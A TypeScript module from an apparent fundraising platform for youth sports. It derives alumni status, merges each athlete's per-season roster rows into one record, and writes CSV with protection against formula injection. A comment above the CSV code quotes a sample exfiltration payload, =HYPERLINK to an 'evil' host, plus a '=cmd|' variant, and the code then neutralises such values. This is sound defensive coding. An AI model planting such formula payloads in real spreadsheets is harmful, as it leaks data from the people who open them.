/**
 * Alumni identification and cross-season aggregation.
 *
 * The year-over-year story: a program runs one Campaign per season, and each
 * season's roster import creates a *fresh* TeamMember row. The same human
 * therefore appears once per season they played. To build an alumni database we
 * have to (a) decide who has already graduated and (b) collapse those per-season
 * rows back into one person.
 *
 * Everything here is pure and synchronous so it can be unit-tested without a DB.
 * `now` is always injected rather than read from the clock — alumni status flips
 * on a calendar boundary and tests must be able to sit on either side of it.
 */

export type AlumniStatus = 'CURRENT' | 'ALUMNI' | 'UNKNOWN';

/**
 * The calendar year the *current* US school year ends in.
 * School years roll over in June, matching graduationYearFromGrade() in
 * lib/utils/roster-mapping.ts — keep the two in sync.
 *
 * September 2026 -> the school year ends in 2027.
 * March 2026     -> the school year ends in 2026.
 */
export function currentSchoolYearEnd(now: Date): number {
  return now.getMonth() >= 5 ? now.getFullYear() + 1 : now.getFullYear();
}

/**
 * Classify one athlete.
 *
 * A null/absent graduation year returns UNKNOWN — never CURRENT and never
 * ALUMNI. Guessing here would mean soliciting donations from someone we have no
 * evidence has graduated, so an un-derivable year stays explicitly unknown and
 * the campaign manager decides.
 */
export function deriveAlumniStatus(input: {
  graduationYear?: number | null;
  now: Date;
}): AlumniStatus {
  const { graduationYear, now } = input;

  if (graduationYear === null || graduationYear === undefined) return 'UNKNOWN';
  if (!Number.isFinite(graduationYear) || !Number.isInteger(graduationYear)) return 'UNKNOWN';
  // Defensive: a nonsense year is not evidence of anything.
  if (graduationYear < 1900 || graduationYear > 2200) return 'UNKNOWN';

  // Graduated if their class year is already behind the school year we are in.
  // Class of 2026 in July 2026: schoolYearEnd is 2027, 2026 < 2027 -> ALUMNI.
  // Class of 2026 in March 2026: schoolYearEnd is 2026, 2026 < 2026 is false -> CURRENT.
  return graduationYear < currentSchoolYearEnd(now) ? 'ALUMNI' : 'CURRENT';
}

/** Lowercase + trim an email for use as an identity key. Empty becomes null. */
export function normalizeEmail(email?: string | null): string | null {
  if (!email) return null;
  const trimmed = email.trim().toLowerCase();
  return trimmed || null;
}

/**
 * Reduce a phone to comparable digits. US 11-digit numbers lose their country
 * code so "+1 555-010-1234" and "5550101234" match.
 */
export function normalizePhone(phone?: string | null): string | null {
  if (!phone) return null;
  let digits = phone.replace(/\D/g, '');
  if (digits.length === 11 && digits.startsWith('1')) digits = digits.slice(1);
  return digits.length >= 7 ? digits : null;
}

/** Strip a name to comparable letters/digits: "O'Brien, Sean" -> "obriensean". */
export function normalizeName(name?: string | null): string {
  if (!name) return '';
  return name.toLowerCase().replace(/[^a-z0-9]/g, '');
}

/**
 * Identity key used to collapse per-season rows into one person.
 *
 * Email is the strong signal and wins whenever present. Without one we fall back
 * to name + graduation year, which is deliberately conservative: two athletes
 * named "Chris Jones" in the same graduating class will merge, but that is far
 * rarer than the same Chris Jones appearing in four consecutive seasons, and the
 * failure mode (one merged row) is visible to the manager while the opposite
 * failure mode (four duplicate rows per athlete) makes the database unusable.
 */
export function alumniDedupeKey(member: {
  email?: string | null;
  name?: string | null;
  graduationYear?: number | null;
}): string {
  const email = normalizeEmail(member.email);
  if (email) return `email:${email}`;
  return `name:${normalizeName(member.name)}|${member.graduationYear ?? ''}`;
}

/** One per-season TeamMember row feeding the aggregation. */
export interface AlumniSourceMember {
  id: string;
  name: string;
  email?: string | null;
  phone?: string | null;
  phoneNumber?: string | null;
  graduationYear?: number | null;
  jerseyNumber?: string | null;
  position?: string | null;
  /** Cents. bigint straight off Prisma is fine. */
  amountRaised?: bigint | number | null;
  campaignId: string;
  campaignName?: string | null;
  seasonYear?: number | null;
  campaignStartDate?: Date | string | null;
}

export interface AlumniSeason {
  campaignId: string;
  campaignName: string | null;
  seasonYear: number | null;
  startDate: string | null;
  /** Cents raised by this athlete in this season. */
  amountRaised: number;
}

export interface AlumniRecord {
  key: string;
  name: string;
  email: string | null;
  phone: string | null;
  graduationYear: number | null;
  status: AlumniStatus;
  jerseyNumber: string | null;
  position: string | null;
  /** Ascending by season. */
  seasonsPlayed: AlumniSeason[];
  seasonCount: number;
  firstSeason: AlumniSeason | null;
  lastSeason: AlumniSeason | null;
  /** Cents, summed across every season. Number() — safe for JSON. */
  lifetimeRaised: number;
  /** Every TeamMember row that merged into this person. */
  memberIds: string[];
}

function toCents(value: bigint | number | null | undefined): number {
  if (value === null || value === undefined) return 0;
  const n = Number(value);
  return Number.isFinite(n) ? n : 0;
}

function toIsoOrNull(value: Date | string | null | undefined): string | null {
  if (!value) return null;
  const date = value instanceof Date ? value : new Date(value);
  return Number.isNaN(date.getTime()) ? null : date.toISOString();
}

/**
 * Sortable recency for a season. Prefers the explicit seasonYear, falls back to
 * the campaign start date, and finally to 0 so undated rows sort oldest.
 */
function seasonRank(member: AlumniSourceMember): number {
  if (typeof member.seasonYear === 'number' && Number.isFinite(member.seasonYear)) {
    return member.seasonYear * 10000;
  }
  const iso = toIsoOrNull(member.campaignStartDate);
  if (iso) return new Date(iso).getFullYear() * 10000 + 1;
  return 0;
}

function startTime(member: AlumniSourceMember): number {
  const iso = toIsoOrNull(member.campaignStartDate);
  return iso ? new Date(iso).getTime() : 0;
}

/**
 * Collapse per-season TeamMember rows into one record per human.
 *
 * Merge rules:
 * - contact details: most recent season's non-null value wins (people change
 *   emails and phones; the newest one we saw is the best bet)
 * - lifetimeRaised: summed across all seasons
 * - graduationYear: most recent non-null (a later import may have corrected it)
 * - seasonsPlayed: every distinct campaign, ascending
 */
export function aggregateAlumni(
  members: AlumniSourceMember[],
  options: { now?: Date } = {}
): AlumniRecord[] {
  const now = options.now ?? new Date();
  const groups = new Map<string, AlumniSourceMember[]>();

  for (const member of members) {
    const key = alumniDedupeKey(member);
    const existing = groups.get(key);
    if (existing) existing.push(member);
    else groups.set(key, [member]);
  }

  const records: AlumniRecord[] = [];

  for (const [key, group] of groups) {
    // Most recent season first, so "first non-null wins" means "newest wins".
    const newestFirst = [...group].sort(
      (a, b) => seasonRank(b) - seasonRank(a) || startTime(b) - startTime(a)
    );

    const firstNonNull = <T>(pick: (m: AlumniSourceMember) => T | null | undefined): T | null => {
      for (const m of newestFirst) {
        const value = pick(m);
        if (value !== null && value !== undefined && value !== '') return value;
      }
      return null;
    };

    // One season entry per campaign; a duplicate row inside a single campaign
    // gets its amount folded in rather than double-counted as a second season.
    const seasonsByCampaign = new Map<string, AlumniSeason>();
    for (const m of [...newestFirst].reverse()) {
      const existing = seasonsByCampaign.get(m.campaignId);
      if (existing) {
        existing.amountRaised += toCents(m.amountRaised);
        continue;
      }
      seasonsByCampaign.set(m.campaignId, {
        campaignId: m.campaignId,
        campaignName: m.campaignName ?? null,
        seasonYear: typeof m.seasonYear === 'number' ? m.seasonYear : null,
        startDate: toIsoOrNull(m.campaignStartDate),
        amountRaised: toCents(m.amountRaised),
      });
    }

    const byCampaignId = new Map(group.map((m) => [m.campaignId, m]));
    const seasonsPlayed = [...seasonsByCampaign.values()].sort((a, b) => {
      const ma = byCampaignId.get(a.campaignId);
      const mb = byCampaignId.get(b.campaignId);
      if (!ma || !mb) return 0;
      return seasonRank(ma) - seasonRank(mb) || startTime(ma) - startTime(mb);
    });

    const graduationYear = firstNonNull((m) =>
      typeof m.graduationYear === 'number' ? m.graduationYear : null
    );

    records.push({
      key,
      name: firstNonNull((m) => m.name) ?? '',
      email: normalizeEmail(firstNonNull((m) => m.email)),
      phone: firstNonNull((m) => m.phone) ?? firstNonNull((m) => m.phoneNumber) ?? null,
      graduationYear,
      status: deriveAlumniStatus({ graduationYear, now }),
      jerseyNumber: firstNonNull((m) => m.jerseyNumber),
      position: firstNonNull((m) => m.position),
      seasonsPlayed,
      seasonCount: seasonsPlayed.length,
      firstSeason: seasonsPlayed[0] ?? null,
      lastSeason: seasonsPlayed[seasonsPlayed.length - 1] ?? null,
      lifetimeRaised: group.reduce((sum, m) => sum + toCents(m.amountRaised), 0),
      memberIds: group.map((m) => m.id),
    });
  }

  // Newest cohort first, then alphabetical. Unknown grad years sort last: they
  // need a human decision, they are not the manager's first call.
  return records.sort((a, b) => {
    const ay = a.graduationYear ?? -Infinity;
    const by = b.graduationYear ?? -Infinity;
    if (ay !== by) return by - ay;
    return a.name.localeCompare(b.name);
  });
}

/**
 * RFC-4180 CSV. Every field is quoted unconditionally and inner quotes are
 * doubled, so names like `Bobby "Bo" O'Neil, Jr.` survive a round trip into
 * Excel or Google Sheets.
 *
 * Formula injection: Excel and Sheets EVALUATE a cell whose text begins with
 * `=`, `+`, `-` or `@` — quoting does not stop it. Alumni names, emails and
 * notes are attacker-supplied (anyone who can get onto a roster or submit a
 * contact), so a value of `=HYPERLINK("http://evil/"&A1)` would fire the moment
 * a coach opens the export. A leading apostrophe is the spreadsheet convention
 * for "treat this cell as literal text".
 *
 * Leading whitespace and control characters are skipped before the formula
 * character is looked for: spreadsheets trim the cell before evaluating it, so
 * `" =cmd|..."`, a leading tab and `"\n=..."` are all still live formulas. The
 * `\s` class already covers space, tab, CR, LF and the Unicode spaces; the
 * explicit \u0000-\u001f range adds the remaining C0 controls (including a
 * stray BOM-adjacent byte) that `\s` does not.
 */
const CSV_FORMULA_PREFIX = /^[\s\u0000-\u001f\u200b\ufeff]*[=+\-@]/;

export function toCsvValue(value: unknown): string {
  if (value === null || value === undefined) return '""';
  const text = String(value);
  const safe = CSV_FORMULA_PREFIX.test(text) ? `'${text}` : text;
  return `"${safe.replace(/"/g, '""')}"`;
}

export function toCsvRow(values: unknown[]): string {
  return values.map(toCsvValue).join(',');
}

export function toCsv(headers: string[], rows: unknown[][]): string {
  return [toCsvRow(headers), ...rows.map(toCsvRow)].join('\r\n');
}
